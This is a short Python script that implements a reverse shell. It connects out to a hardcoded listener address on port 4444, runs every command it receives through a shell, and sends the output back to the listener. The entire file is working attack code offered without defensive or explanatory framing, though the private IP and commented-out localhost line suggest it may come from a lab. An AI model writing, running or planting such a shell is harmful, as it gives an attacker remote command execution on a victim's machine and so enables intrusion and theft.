import socket
import subprocess

# LISTENER_IP = "127.0.0.1"
LISTENER_IP = "172.20.3.89"
LISTENER_PORT = 4444

def create_shell():
    try:
        # Create a TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the listener at the specified IP and port
        s.connect((LISTENER_IP, LISTENER_PORT))

        while True:
            # Receive command from the listener
            command = s.recv(1024).decode("utf-8")
            if command.strip().lower() == "exit":
                break

            # Execute the received command
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            # Read both stdout and stderr
            output = process.stdout.read() + process.stderr.read()

            # Send the result back to the listener
            if output:
                s.send(output)
            else:
                s.send(b"[No output]\n")

    except Exception as e:
        # Send error message if any exception occurs
        s.send(f"[Error]: {e}\n".encode())
    finally:
        # Close the socket connection
        s.close()

if __name__ == "__main__":
    create_shell()
